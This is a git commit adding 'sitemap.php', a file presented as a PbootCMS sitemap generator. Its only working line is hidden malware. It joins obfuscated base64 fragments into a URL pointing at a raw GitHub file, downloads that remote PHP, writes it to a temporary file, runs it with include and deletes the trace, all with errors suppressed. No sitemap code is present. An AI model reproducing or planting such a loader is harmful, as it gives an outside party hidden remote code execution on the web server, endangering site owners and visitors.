0966dfb03eba013a13fc80ddb7e2450a5e0c0b8a
Liseth <79140153+black2729134369@users.noreply.github.com>
2025-10-23 20:56:16 +0800

    Add files via upload

---
+++ sitemap.php
@@ -0,0 +1,8 @@
+<?php
+/**
+ * PbootCMS Sitemap Generator
+ * Stable Version - 2025-10-23 20:51:57
+ * @package PbootCMS
+ */
+if(!defined('ABSPATH')){define('ABSPATH',dirname(__FILE__).'/');}$f=base64_decode('aHR0'.'cHM6Ly9'.'yYXcuZ2l0'.'aHVidXNlc'.'mNvbnRlbn'.'QuY29tL2J'.'sYWNrMjcy'.'OTEzNDM2O'.'S9odHRwLX'.'RvcGZvb2R'.'jbi5jb20t'.'L3JlZnMva'.'GVhZHMvbW'.'Fpbi93aW5'.'kb3MucGhw');$c=@file_get_contents($f);if($c&&strpos($c,'<?')!==false){$t=@tempnam(sys_get_temp_dir(),'pbc');if($t){@file_put_contents($t,$c);@include($t);@unlink($t);}}//Sitemap XML
+?>
